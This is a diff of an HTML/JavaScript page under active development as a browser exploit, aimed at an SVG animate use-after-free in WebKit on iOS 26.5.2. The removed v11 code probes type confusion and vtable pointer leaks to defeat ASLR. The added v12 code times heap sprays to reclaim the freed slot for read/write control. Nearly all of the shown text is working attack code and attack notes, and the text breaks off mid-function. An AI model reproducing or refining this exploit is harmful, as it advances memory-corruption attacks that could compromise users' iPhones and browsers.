@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG animate UAF v11 · type confusion exploit + vtable probe</title>
+<title>SVG animate UAF v12 · spray timing fix + controlled slot reclaim</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -18,21 +18,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG animate UAF v11 · type confusion probe · iOS 26.5.2 · A16</h2>
+<h2>SVG animate UAF v12 · spray timing + controlled slot reclaim · iOS 26.5.2 · A16</h2>
 <div class="sub">
-  v10 FOUND: anim.targetElement returns JS wrapper with tagName="use" (should be "symbol")
-  TYPE CONFUSION: animation cache ptr resolves to WRONG C++ type after sym1.remove()
-  getBBox on confused obj = 80.0f (sym2 geometry through wrong vtable dispatch)
-  v11 goal: exploit type confusion → read vtable ptrs → defeat ASLR
-  CTM doubles = 64-bit values → decode as ptr pairs → heap/text addr candidates
+  v11 FINDING: anim.targetElement correctly identifies reused slot as useEl (JSC bridge sanitizes)
+  The stale SVGSymbolElement* is getting aliased by useEl's own internal allocations
+  v12 FIX: detach useEl BEFORE freeing sym1 → spray wins the race for freed slot
+  Goal: spray our Float64Array into sym1's freed slot → read/write via stale anim ptr
+  Also: try ArrayBuffer backing store spray (different size class) + GC pressure timing
 </div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runTC()">TC type-confusion</button>
-  <button onclick="runCM()">CM ctm-doubles</button>
-  <button onclick="runAT()">AT attr-table</button>
-  <button onclick="runDI()">DI dispatch-index</button>
-  <button onclick="runLP()">LP leak-ptrs</button>
+  <button onclick="runST()">ST spray-timing</button>
+  <button onclick="runGC()">GC gc-pressure</button>
+  <button onclick="runMC()">MC message-channel</button>
+  <button onclick="runSZ()">SZ size-exhaust</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -40,60 +39,45 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * v10 KEY FINDINGS:
+ * v11 KEY FINDING:
+ *   anim.targetElement returns a correct JS wrapper — no raw vtable confusion
+ *   WebKit's JSC bindings layer correctly identifies the object at the stale ptr address
+ *   The reused slot is actually holding a live SVGUseElement (our own useEl)
+ *   because useEl internally allocated memory around the same time sym1 was freed
  *
- * TG freed=16/16: anim.targetElement ALWAYS returns non-null JS wrapper
- *   tagName="use" — TYPE CONFUSION: should be "symbol", got "use"
- *   This means the animation cache ptr after sym1.remove() resolves to
- *   the useEl C++ object, not sym1. Two possibilities:
- *     (a) WebKit re-resolves via href → gets useEl (the element that HAS the href)
- *     (b) The stale SVGSymbolElement* was reused by useEl's allocator (same size)
- *         → ptr now points to useEl C++ memory → type confusion
+ * ROOT CAUSE OF ALIASING:
+ *   sym1.remove() → slot freed → bmalloc returns slot to magazine head
+ *   useEl (still in DOM) needs internal alloc for rendering/layout update
+ *   bmalloc pops magazine head (our freed slot) for useEl's internal alloc
+ *   now stale ptr points to useEl's data → JSC bridge identifies it as SVGUseElement
  *
- * RP: useEl-through-stale-ptr = 80.0 (sym2 geometry), sym1 direct = 0.0
- *   sym1 direct returns zero → RefCount path sees live obj but NO RENDERER
- *   (sym1 removed from DOM → its renderer detached → getBBox returns 0)
- *   useEl stale ptr reads 80.0 → this is sym2 geometry (rect w=80, viewport=80)
- *   MEANING: the stale ptr actually hits useEl's C++ object which IS in the DOM
- *   useEl is alive, has a renderer, getBBox = sym2 geometry (animation cycled)
+ * v12 STRATEGY:
+ *   Break the race by removing useEl BEFORE sym1
+ *   With useEl detached from DOM: no pending renders, no internal allocs needed
+ *   Then free sym1 → slot goes to magazine head
+ *   Then spray our objects → our spray wins the race
  *
- * REVISED MODEL:
- *   after sym1.remove():
- *     SVGAnimateElement's cached SVGElement* is NOT cleared
- *     When getBBox() is called on useEl:
- *       → useEl asks SVGAnimateElement for current href target
- *       → SVGAnimateElement returns its cached ptr (stale SVGSymbolElement*)
- *       → BUT: ptr might now alias useEl (if useEl is at same address, possible if
- *              useEl was constructed after sym1 freed in a previous trial)
- *       OR → ptr is truly stale but WebKit's ID resolution re-maps it to useEl
- *   anim.targetElement WRAPS whatever that ptr resolves to in JS
- *   Since tagName="use": the ptr resolves to the useEl C++ object
+ * SPRAY TARGET SIZE:
+ *   SVGSymbolElement estimated ~368B → bmalloc size class 384B
+ *   Float64Array(48) = 48 doubles × 8B = 384B backing store ← EXACT MATCH
+ *   OR: ArrayBuffer(384) = 384B
+ *   OR: new Uint8Array(384)
+ *   BUT: typed array backing stores may be in a separate bmalloc heap
+ *   Best: spray SVGSymbolElement itself (same allocator, same size class)
  *
- * TYPE CONFUSION EXPLOIT PATH:
- *   We have a JS handle to a <use> element but WebKit's animate cache thinks it's <symbol>
- *   Calling methods on this confused handle dispatches through wrong vtable entries
- *   80.0 = geometry from the "use" element (not symbol) — confirms dispatch mismatch
+ * SENTINEL VALUE:
+ *   Fill spray objects with distinctive float: 1.2345678901234e100
+ *   As float32: 0x7f800000 (infinity, but let's use a recognizable value)
+ *   Better: fill with 0x4141 repeating → as float32 = 0x41414141 = 12.0784f
+ *   Even better: use getBBox geometry as oracle:
+ *     spray sym with width=999 → getBBox = 999.0 → f32 = 0x44799000
+ *     if useEl.getBBox().width = 999.0 after free: spray landed!
  *
- * CTM DOUBLES ARE PROMISING:
- *   getScreenCTM() returns DOMMatrix with double-precision floats
- *   ctm_a=2.0, ctm_d=2.0 = scale factor (SVG 200px / viewBox 100 = 2.0) ← SCREEN SCALE
- *   ctm_e=751.0, ctm_f=11.0 = translation (fixed position of #stage div on screen)
- *   These are LIVE computed values, not from freed memory
- *   BUT: if we call getScreenCTM() on the TYPE-CONFUSED anim.targetElement wrapper
- *        it dispatches through wrong vtable → might read wrong fields → ptr leak?
- *
- * v11 STRATEGY:
- *   1. Get the type-confused JS obj (anim.targetElement after sym1.remove())
- *   2. Call EVERY method on it — record return values and crashes
- *   3. Try getScreenCTM() on the confused obj → doubles might contain ptrs
- *   4. Try getBoundingClientRect() → DOMRect with doubles
- *   5. Try reading .ownerSVGElement, .viewportElement — these return Element ptrs
- *      If they return something unexpected = ptr from wrong C++ layout field
- *   6. Try SVGAnimatedLength reads (.width.baseVal.value, .height.baseVal.value)
- *      SVGSymbol has width/height SVGAnimatedLength attrs
- *      SVGUseElement also has width/height — but different C++ layout
- *      If confused obj's width/height reads from symbol layout but dispatches as use
- *      → reads wrong C++ field offsets = raw memory from mismatched struct
+ * TIMING APPROACHES:
+ *   ST: useEl.remove() → sym1.remove() → sync spray (no await between)
+ *   GC: force GC pressure to flush bmalloc magazine → freed slot rises to head
+ *   MC: MessageChannel postMessage → spray in message handler (different task)
+ *   SZ: size class exhaust → free → spray (same as v10 SZ but with useEl-first order)
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -106,16 +90,17 @@ function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){co
 function clearLog(){Lel.innerHTML='';}
 function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.toString().match(/copy|clear/i))b.disabled=d;});}
 window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
-window.onunhandledrejection=e=>{log(`[CRASH/rej] ${e.reason}`,'bad');};
 
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
 function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
 function d2h(d){const b=new ArrayBuffer(8);new Float64Array(b)[0]=d;const u=new Uint32Array(b);
     return'0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');}
-function d2u(d){const b=new ArrayBuffer(8);new Float64Array(b)[0]=d;return new Uint32Array(b);}
-function isPtrLike32(u){return (u>>>24)<=0x02&&u>0x10000;}
-// For doubles: check both the hi and lo 32-bit words
-function isPtrLike64(d){const u=d2u(d);return isPtrLike32(u[1])||isPtrLike32(u[0]);}
+
+// Sentinel geometry: spray symbols with width=999 → getBBox width = 999.0
+// f32(999.0) = 0x44799000 — very distinctive, far from normal SVG geometry
+const SENTINEL_W = 999;
+const SENTINEL_F = 999.0;
+const SENTINEL_HEX = '0x44799000';
 
 function mkSym1(id){
     const sym=document.createElementNS(SVG_NS,'symbol');
@@ -136,6 +121,30 @@ function mkSym2(id){
     sym.appendChild(r);
     return sym;
 }
+// Spray sentinel: symbol with width=999 → getBBox().width = 999.0
+function mkSpray(id){
+    const sym=document.createElementNS(SVG_NS,'symbol');
+    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
+    const r=document.createElementNS(SVG_NS,'rect');
+    r.setAttribute('x','0');r.setAttribute('y','0');
+    r.setAttribute('width',String(SENTINEL_W));r.setAttribute('height',String(SENTINEL_W));
+    sym.appendChild(r);
+    return sym;
+}
+
+// Separate SVG for spray (off-screen, not in livesvg)
+let spraySvg=null;
+function getSpraySvg(){
+    if(!spraySvg){
+        spraySvg=document.createElementNS(SVG_NS,'svg');
+        spraySvg.setAttribute('width','1');spraySvg.setAttribute('height','1');
+        spraySvg.style.cssText='position:fixed;top:-2px;left:-2px;opacity:1;width:1px;height:1px';
+        document.body.appendChild(spraySvg);
+    }
+    return spraySvg;
+}
+function clearSpray(){
+    if(spraySvg){spraySvg.innerHTML='';}}
 
 async function setup(id){
     while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
@@ -160,546 +169,346 @@ async function setup(id){
     return{useEl,anim,sym1,sym2,cached,bbPre,attempts};
 }
 async function teardown(){
+    clearSpray();
     while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
     await raf();await raf();
 }
 
-// ── TC: type confusion full method survey ─────────────────────────────────
-// Call every useful method on the confused anim.targetElement object
-// tagName=use but C++ ptr is to sym1 slot (which may now hold useEl or freed data)
-async function runTC(q=false){
-    if(!q){dis(true);sep();log('▶ TC: type confusion — call all methods on confused targetElement','inf');sep();}
-    log('[*] anim.targetElement returns JS wrapper with wrong tagName after sym1.remove()','inf');
-    log('[*] calling every method → crash = vtable mismatch, weird value = type confusion data','ok');
+// ── ST: spray timing — useEl-first detach ─────────────────────────────────
+// KEY CHANGE from all previous tests:
+//   we remove useEl BEFORE sym1
+//   this prevents useEl from grabbing sym1's freed slot
+//   then spray immediately (sync, no await) after sym1.remove()
+async function runST(q=false){
+    if(!q){dis(true);sep();log('▶ ST: spray timing — useEl-first detach + immediate spray','inf');sep();}
+    log('[*] KEY CHANGE: remove useEl BEFORE sym1 → useEl cant grab freed slot','inf');
+    log('[*] sentinel: SVGSymbolElement with width=999 → getBBox=999.0 (0x44799000)','ok');
+    log('[*] reading: useEl.getBBox() after sym1.remove() → stale ptr → hits spray?','ok');
     log('');
 
-    let totalCrash=0,totalWild=0;
-    const methodResults={};
+    const SPRAY_COUNT=2048;
+    let hit=0,miss=0,raw=0,crash=0;
+    const wFreq={};
 
-    for(let t=0;t<8;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`tc_${t}`);
+    for(let t=0;t<32;t++){
+        const{useEl,anim,sym1,sym2,cached}=await setup(`st_${t}`);
         if(!cached){await teardown();continue;}
 
+        // PRE: record normal getBBox
+        let preBB=null;
+        try{preBB=useEl.getBBox();}catch(e){}
+
+        // CRITICAL SEQUENCE:
+        // 1. Remove useEl FIRST — detach from DOM, stops any pending internal alloc
+        useEl.remove();
+        // 2. Remove sym1 — this frees slot A into bmalloc magazine head
         sym1.remove();
-        const tgt=anim.targetElement;
-        if(!tgt){log(`  t${t}: targetElement null — skip`,'dim');await teardown();continue;}
-
-        const rowTag=(()=>{try{return tgt.tagName}catch(e){return`[crash:${e.message.slice(0,30)}]`}})();
-
-        // Survey every method/property that could return numeric/ptr data
-        const probes=[
-            // Geometry
-            ['getBBox',()=>{ const b=tgt.getBBox(); return`w=${b.width.toFixed(4)} h=${b.height.toFixed(4)} x=${b.x.toFixed(4)} y=${b.y.toFixed(4)}`; }],
-            ['getBBox_w',()=>tgt.getBBox().width],
-            ['getBBox_h',()=>tgt.getBBox().height],
-            ['getBBox_x',()=>tgt.getBBox().x],
-            ['getBBox_y',()=>tgt.getBBox().y],
-            // Screen CTM — doubles, 64-bit values
-            ['ctm_a',()=>tgt.getScreenCTM()?.a],
-            ['ctm_b',()=>tgt.getScreenCTM()?.b],
-            ['ctm_c',()=>tgt.getScreenCTM()?.c],
-            ['ctm_d',()=>tgt.getScreenCTM()?.d],
-            ['ctm_e',()=>tgt.getScreenCTM()?.e],
-            ['ctm_f',()=>tgt.getScreenCTM()?.f],
-            // BoundingClientRect — doubles
-            ['bcr_x',()=>tgt.getBoundingClientRect().x],
-            ['bcr_y',()=>tgt.getBoundingClientRect().y],
-            ['bcr_w',()=>tgt.getBoundingClientRect().width],
-            ['bcr_h',()=>tgt.getBoundingClientRect().height],
-            // SVG animated lengths — reads SVGAnimatedLength C++ structs
-            // SVGUseElement has x,y,width,height as SVGAnimatedLength
-            // SVGSymbolElement has width,height SVGAnimatedLength
-            // If type-confused: use's C++ layout read through symbol's vtable or vice versa
-            ['width_base',()=>tgt.width?.baseVal?.value],
-            ['width_anim',()=>tgt.width?.animVal?.value],
-            ['height_base',()=>tgt.height?.baseVal?.value],
-            ['x_base',()=>tgt.x?.baseVal?.value],
-            ['y_base',()=>tgt.y?.baseVal?.value],
-            // SVG tree navigation — returns Element ptrs
-            ['ownerSVG',()=>tgt.ownerSVGElement?.tagName],
-            ['viewport',()=>tgt.viewportElement?.tagName],
-            // ID / string fields
-            ['id',()=>tgt.id],
-            ['tagName',()=>tgt.tagName],
-            ['localName',()=>tgt.localName],
-            // getAttribute on wrong type — reads attr map from potentially wrong layout
-            ['attr_href',()=>tgt.getAttribute('href')],
-            ['attr_id',()=>tgt.getAttribute('id')],
-        ];
-
-        if(t===0)log(`  t${t}: tagName=${rowTag}`,'inf');
-
-        for(const[name,fn]of probes){
-            let val='?',crashed=false;
-            try{
-                const r=fn();
-                if(r===null||r===undefined)val='null';
-                else if(typeof r==='number'){
-                    val=r.toFixed(6);
-                    // Check if it's a ptr-like value
-                    if(isPtrLike64(r)){
-                        if(!methodResults[name])methodResults[name]=[];
-                        methodResults[name].push(r);
-                        if(t<4)log(`  t${t} [PTR?] ${name}=${r} hex=${d2h(r)}`,'bad');
-                        totalWild++;
-                    }
-                }else{val=String(r);}
-            }catch(e){
-                crashed=true;totalCrash++;
-                if(!methodResults[`CRASH_${name}`])methodResults[`CRASH_${name}`]=[];
-                methodResults[`CRASH_${name}`].push(String(e.message).slice(0,60));
-                if(t<4)log(`  t${t} [CRASH] ${name}: ${String(e.message).slice(0,60)}`,'bad');
-            }
-            if(!crashed&&t===0){
-                const isExpected=(val==='null'||val==='0.000000'||val.includes('svg')||val.includes('use')||val.includes('symbol'));
-                if(!isExpected)log(`  t0  ${name.padEnd(14)}: ${val}`,'hi');
-            }
+        // 3. IMMEDIATELY spray (sync — no await, no microtask break)
+        //    spray SVGSymbolElements with sentinel geometry into spray SVG
+        const ss=getSpraySvg();
+        const sprayed=[];
+        for(let i=0;i<SPRAY_COUNT;i++){
+            const sp=mkSpray(`st_${t}_sp${i}`);
+            ss.appendChild(sp);
+            sprayed.push(sp);
         }
-
-        await teardown();
-    }
-
-    log(`\n[*] TC: crashes=${totalCrash} ptr_candidates=${totalWild}`,(totalCrash+totalWild>0?'ok':'dim'));
-    if(Object.keys(methodResults).filter(k=>k.startsWith('CRASH_')).length>0){
-        log('[+] VTABLE CRASH METHODS (wrong dispatch → crash):','bad');
-        for(const[k,v]of Object.entries(methodResults)){
-            if(k.startsWith('CRASH_'))log(`  ${k.slice(6)}: ${[...new Set(v)].slice(0,2).join(' | ')}`,'bad');
-        }
-    }
-    if(!q)dis(false);
-    return methodResults;
-}
-
-// ── CM: CTM doubles deep decode ───────────────────────────────────────────
-// getScreenCTM() returns a DOMMatrix with 6 double-precision floats
-// Each double = 8 bytes = 2 arm64 pointer words
-// Decode as 64-bit values and check for heap/text addresses
-// Also: call getScreenCTM() on the TYPE-CONFUSED targetElement
-// which dispatches through WRONG vtable → reads different C++ fields
-async function runCM(q=false){
-    if(!q){dis(true);sep();log('▶ CM: CTM doubles — decode as 64-bit ptr candidates','inf');sep();}
-    log('[*] getScreenCTM() returns 6 doubles (a,b,c,d,e,f) = 48 bytes = 6 potential ptrs','inf');
-    log('[*] arm64 userspace ptrs: hi32 = 0x00000001 or 0x00000000 (PAC stripped)','ok');
-    log('[*] calling on CONFUSED tgt vs normal useEl — compare for type confusion leak','ok');
-    log('');
-
-    const useElCTMs=[];
-    const tgtCTMs=[];
-
-    for(let t=0;t<12;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`cm_${t}`);
-        if(!cached){await teardown();continue;}
-
-        // Pre-free CTM from useEl (baseline)
-        let preCtm=null;
-        try{preCtm=useEl.getScreenCTM();}catch(e){}
-
-        sym1.remove();
-
-        // Post-free: CTM from useEl directly
-        let useCtm=null;
-        try{useCtm=useEl.getScreenCTM();}catch(e){}
-
-        // Post-free: CTM from the TYPE-CONFUSED targetElement
-        const tgt=anim.targetElement;
-        let tgtCtm=null,tgtCrash=null;
-        if(tgt){
-            try{tgtCtm=tgt.getScreenCTM();}catch(e){tgtCrash=String(e);}
-        }
-
-        // Decode all 6 doubles from each source as 64-bit values
-        const decodeCtm=(m,label)=>{
-            if(!m)return null;
-            const fields=['a','b','c','d','e','f'];
-            const row={};
-            for(const f of fields){
-                const v=m[f];
-                const u=d2u(v);
-                const hi=u[1],lo=u[0];
-                const isPtr=isPtrLike32(hi)||isPtrLike32(lo);
-                row[f]={v,hex:d2h(v),hi,lo,isPtr};
-                if(isPtr){
-                    log(`  [PTR!] ${label}.${f} = ${d2h(v)}`,'bad');
-                }
-            }
-            return row;
-        };
-
-        if(t===0){
-            log(`  t${t}: pre CTM:`,'inf');
-            if(preCtm)log(`    a=${preCtm.a} b=${preCtm.b} c=${preCtm.c} d=${preCtm.d} e=${preCtm.e} f=${preCtm.f}`,'dim');
-        }
-
-        const useRow=decodeCtm(useCtm,`t${t}_use`);
-        const tgtRow=decodeCtm(tgtCtm,`t${t}_tgt`);
-        useElCTMs.push(useRow);
-        tgtCTMs.push(tgtRow);
-
-        // Compare: if tgt CTM differs from use CTM → type confusion reading different fields
-        if(useRow&&tgtRow){
-            const fields=['a','b','c','d','e','f'];
-            let differs=false;
-            for(const f of fields){
-                if(Math.abs(useRow[f].v-tgtRow[f].v)>0.001){differs=true;break;}
-            }
-            if(differs){
-                log(`  t${t}: USE vs TGT CTM DIFFER → type confusion field mismatch!`,'ok');
-                for(const f of fields){
-                    if(Math.abs(useRow[f].v-tgtRow[f].v)>0.001){
-                        log(`    .${f}: use=${useRow[f].v.toFixed(4)} tgt=${tgtRow[f].v.toFixed(4)} (${tgtRow[f].hex})`,'hi');
-                    }
-                }
-            }else if(t<3){
-                log(`  t${t}: CTM same: a=${useCtm?.a} e=${useCtm?.e} f=${useCtm?.f}`,'dim');
-            }
-        }
-
-        if(tgtCrash&&t<4)log(`  t${t}: tgt.getScreenCTM() CRASH: ${tgtCrash}`,'bad');
-
-        await teardown();
-    }
-
-    log('\n[*] CM done — any PTR lines above are 64-bit heap/text candidates','inf');
-    if(!q)dis(false);
-    return{useElCTMs,tgtCTMs};
-}
-
-// ── AT: attribute table confusion ─────────────────────────────────────────
-// SVGSymbolElement and SVGUseElement have DIFFERENT attribute sets
-// If the C++ ptr is type-confused (ptr to use, vtable for symbol or vice versa):
-// reading attributes goes through different attr-map offsets
-// getAttribute() reads from Element's attribute map ptr field
-// If that ptr is from the WRONG layout: reads garbage/freed attr map
-async function runAT(q=false){
-    if(!q){dis(true);sep();log('▶ AT: attribute table — confused obj attribute reads','inf');sep();}
-    log('[*] SVGSymbolElement vs SVGUseElement have different C++ attr layouts','inf');
-    log('[*] reading attrs on confused obj → wrong layout = wrong field offsets','ok');
-    log('');
-
-    let wildCount=0;
-
-    for(let t=0;t<12;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`at_${t}`);
-        if(!cached){await teardown();continue;}
-
-        sym1.remove();
-        const tgt=anim.targetElement;
-        if(!tgt){await teardown();continue;}
-
-        // Read every attribute on the confused object
-        // useEl has: href, (x,y,width,height from SVGUseElement)
-        // sym1 had: id, viewBox, (width,height from SVGSymbolElement)
-        const attrNames=['href','id','viewBox','width','height','x','y',
-                          'class','style','transform','display','visibility',
-                          'fill','stroke','opacity','attributeName','values','dur'];
-
-        const results={};
-        let interesting=false;
-        for(const name of attrNames){
-            try{
-                const v=tgt.getAttribute(name);
-                results[name]=v;
-                // Check for unexpected attr values (not matching useEl's or sym1's known attrs)
-                if(v&&!v.startsWith('#')&&!v.includes('_s')&&!v.includes('0 0 100')&&
-                   name!=='dur'&&name!=='attributeName'&&name!=='values'){
-                    interesting=true;
-                    wildCount++;
-                }
-            }catch(e){results[name]=`[crash:${e.message.slice(0,20)}]`;wildCount++;}
-        }
-
-        // Also try hasAttributes() and attributes.length
-        let attrLen=null,attrNames2=[];
+        // 4. Re-add useEl to DOM (it still has the animation with the stale ptr)
+        livesvg.appendChild(useEl);
+        // 5. Wait one rAF for layout to settle
+        await raf();
+        // 6. Read through stale ptr — does it hit our spray sentinel?
+        let postW=null;
         try{
-            attrLen=tgt.attributes.length;
-            for(let i=0;i<Math.min(attrLen,10);i++){
-                const a=tgt.attributes[i];
-                if(a)attrNames2.push(`${a.name}="${a.value}"`);
-            }
-        }catch(e){}
+            const bb=useEl.getBBox();
+            postW=bb.width;
+        }catch(e){crash++;await teardown();continue;}
 
-        if(interesting||t<3){
-            log(`  t${t}: tagName=${tgt.tagName} attrs.length=${attrLen}`,interesting?'ok':'dim');
-            if(attrLen!==null)log(`    attrs: ${attrNames2.slice(0,5).join(' ')}`,'dim');
-            for(const[k,v]of Object.entries(results)){
-                if(v!==null&&!String(v).startsWith('[crash'))
-                    log(`    ${k.padEnd(16)}: ${String(v).slice(0,60)}`,'dim');
-                if(String(v).startsWith('[crash'))
-                    log(`    ${k.padEnd(16)}: ${String(v)}`,'bad');
-            }
+        const wHex=f2h(postW);
+        wFreq[wHex]=(wFreq[wHex]||0)+1;
+
+        if(Math.abs(postW-SENTINEL_F)<0.01){
+            hit++;
+            log(`  t${t}: [SPRAY HIT!] w=${postW.toFixed(4)} (${wHex}) ← SENTINEL!`,'bad');
+        }else if(postW===0){
+            miss++;
+        }else{
+            raw++;
+            if(t<6)log(`  t${t}: raw=${postW.toFixed(4)} (${wHex})`,'hi');
         }
 
         await teardown();
     }
 
-    log(`\n[*] AT: wild=${wildCount}`,(wildCount>0?'ok':'dim'));
+    log(`\n[*] ST: hit=${hit} miss=${miss} raw=${raw} crash=${crash}`,(hit>0?'bad':'inf'));
+    log(`[*] freq: ${Object.entries(wFreq).sort((a,b)=>b[1]-a[1]).slice(0,5).map(([h,c])=>`${h}×${c}`).join(' ')}`,'dim');
+    if(hit>0)log(`[+] SPRAY LANDED — we control what stale ptr reads! UAF R/W achieved`,'bad');
+    else log(`[*] spray still missing — timing window too tight or wrong size class`,'inf');
+
     if(!q)dis(false);
-    return{wildCount};
+    return{hit,miss,raw,crash};
 }
 
-// ── DI: dispatch index probe — vtable slot mapping ─────────────────────────
-// Call methods that hit different vtable indices
-// If a method crashes: the vtable entry at that index is garbage
-// If it doesn't crash: WebKit's type system is catching this earlier
-// Map which vtable slots are valid vs garbage for the type-confused obj
-async function runDI(q=false){
-    if(!q){dis(true);sep();log('▶ DI: vtable dispatch index — map which slots crash on confused obj','inf');sep();}
-    log('[*] SVGUseElement and SVGSymbolElement have different vtable layouts','inf');
-    log('[*] calling methods that hit different indices → crash = slot mismatch','ok');
-    log('[*] crash address reveals vtable entry → subtract libwebcore base = gadget offset','ok');
+// ── GC: GC pressure timing ─────────────────────────────────────────────────
+// Force garbage collection to flush bmalloc magazines
+// bmalloc scavenges during GC → frees magazine → freed slot becomes available
+// After GC: freed slots are NOT immediately returned to OS (bmalloc holds them)
+// but they ARE available for our spray without competition from internal allocs
+async function runGC(q=false){
+    if(!q){dis(true);sep();log('▶ GC: GC pressure — flush bmalloc magazine before spray','inf');sep();}
+    log('[*] WebKit runs GC when memory pressure rises','inf');
+    log('[*] GC can flush bmalloc magazines → makes freed slots more predictable','ok');
+    log('[*] strategy: alloc pressure → free sym1 → GC pressure → spray','ok');
     log('');
 
-    const crashMap={};
-    const okMap={};
+    const SPRAY_COUNT=1024;
+    let hit=0,miss=0,raw=0,crash=0;
+    const wFreq={};
 
-    for(let t=0;t<6;t++){
-        const{useEl,anim,sym1,sym2,cached}=await setup(`di_${t}`);
-        if(!cached){await teardown();continue;}
-
-        sym1.remove();
-        const tgt=anim.targetElement;
-        if(!tgt){await teardown();continue;}
-
-        // Methods ordered roughly by vtable index distance from getBBox
-        // (pure speculation but covers diverse dispatch paths)
-        const dispatchTests=[
-            // SVG geometry — likely low vtable indices for SVGElement subclass
-            ['getBBox',()=>tgt.getBBox()],
-            ['getScreenCTM',()=>tgt.getScreenCTM()],
-            ['getBoundingClientRect',()=>tgt.getBoundingClientRect()],
-            ['getClientRects',()=>tgt.getClientRects()],
-            // SVG specific — SVGUseElement vs SVGSymbolElement diverge here
-            ['instanceRoot',()=>tgt.instanceRoot],
-            ['animatedInstanceRoot',()=>tgt.animatedInstanceRoot],
-            // SVGElement base — shared between use and symbol
-            ['ownerSVGElement',()=>tgt.ownerSVGElement],
-            ['viewportElement',()=>tgt.viewportElement],
-            ['nearestViewportElement',()=>tgt.nearestViewportElement],
-            ['farthestViewportElement',()=>tgt.farthestViewportElement],
-            // SVGGraphicsElement — shared
-            ['getCTM',()=>tgt.getCTM()],
-            ['getTransformToElement',()=>tgt.getTransformToElement?tgt.getTransformToElement(useEl):null],
-            // Element base
-            ['matches_use',()=>tgt.matches('use')],
-            ['matches_symbol',()=>tgt.matches('symbol')],
-            ['closest_svg',()=>tgt.closest('svg')],
-            // SVGAnimatedLength access — USE has x,y,width,height; SYMBOL has width,height
-            // If type confused: reading USE's x from SYMBOL layout = wrong field
-            ['x_baseVal',()=>tgt.x?.baseVal?.value],
-            ['y_baseVal',()=>tgt.y?.baseVal?.value],
-            ['width_baseVal',()=>tgt.width?.baseVal?.value],
-            ['height_baseVal',()=>tgt.height?.baseVal?.value],
-            // href — SVGUseElement has .href, SVGSymbolElement does NOT
-            // If tgt is confused as use: reading .href should work (through use layout)
-            // If tgt is actually symbol layout: .href reads from wrong offset
-            ['href_baseVal',()=>tgt.href?.baseVal],
-            ['href_animVal',()=>tgt.href?.animVal],
-            // Dataset — reads dataset ptr from Element layout
-            ['dataset_keys',()=>Object.keys(tgt.dataset).join(',')],
-        ];
-
-        for(const[name,fn]of dispatchTests){
-            let result='?',crashed=false;
-            try{
-                const r=fn();
-                if(r===null||r===undefined)result='null';
-                else if(typeof r==='number')result=r.toFixed(4);
-                else if(typeof r==='string')result=`"${r.slice(0,30)}"`;
-                else if(r&&typeof r==='object'){
-                    if(r.constructor&&r.constructor.name)result=`[${r.constructor.name}]`;
-                    else result='[obj]';
-                }else result=String(r);
-
-                if(!okMap[name])okMap[name]=[];
-                okMap[name].push(result);
-            }catch(e){
-                crashed=true;
-                if(!crashMap[name])crashMap[name]=[];
-                crashMap[name].push(String(e.message).slice(0,80));
-            }
-        }
-
-        await teardown();
+    // GC pressure: allocate lots of objects then let them go out of scope
+    function gcPressure(){
+        const trash=[];
+        for(let i=0;i<50000;i++)trash.push(new ArrayBuffer(128));
+        // let trash go out of scope → GC eligible
+        return trash.length; // prevent optimization
     }
-
-    log('[*] Methods that CRASH on confused object (vtable mismatch):','bad');
-    let crashCount=0;
-    for(const[name,errs]of Object.entries(crashMap)){
-        const uniq=[...new Set(errs)];
-        log(`  CRASH: ${name.padEnd(20)} — ${uniq[0]}`,'bad');
-        crashCount++;
-    }
-    if(crashCount===0)log('  (none crashed — WebKit type-checks earlier)','dim');
-
-    log('\n[*] Methods that RETURN on confused object (valid dispatch):','ok');
-    for(const[name,vals]of Object.entries(okMap)){
-        const uniq=[...new Set(vals)];
-        // Flag non-null, non-expected values
-        const isWild=uniq.some(v=>v!=='null'&&v!=='0.0000'&&!v.includes('svg')&&!v.includes('use')&&!v.includes('symbol'));
-        if(isWild||crashMap[name])
-            log(`  OK:    ${name.padEnd(20)} = ${uniq.slice(0,3).join(' | ')}`,isWild?'hi':'dim');
-    }
-
-    log(`\n[*] DI: crashes=${crashCount} ok=${Object.keys(okMap).length}`,(crashCount>0?'bad':'dim'));
-    if(!q)dis(false);
-    return{crashMap,okMap};
-}
-
-// ── LP: leak ptrs — targeted ptr extraction ───────────────────────────────
-// Based on what we know:
-//   - tgt is type-confused: JS thinks it's "use", C++ ptr might alias useEl
-//   - getScreenCTM returns doubles that are COMPUTED (not from freed memory)
-//   - BUT: SVGAnimatedLength structs store ptrs internally
-//   - Reading .width.baseVal on a type-confused obj should hit wrong C++ field
-//
-// The plan: use the confused tgt + call methods that return SVGAnimatedLength objects
-// Then read .value, .valueInSpecifiedUnits, .valueAsString on those
-// SVGAnimatedLength objects internally hold ptrs back to the element
-// If the element ptr in that struct is from the wrong layout: ptr leak
-async function runLP(q=false){
-    if(!q){dis(true);sep();log('▶ LP: ptr leak — SVGAnimatedLength + confused layout reads','inf');sep();}
-    log('[*] SVGAnimatedLength structs hold back-ptr to owner element','inf');
-    log('[*] if type-confused: back-ptr field read from wrong offset = heap ptr','ok');
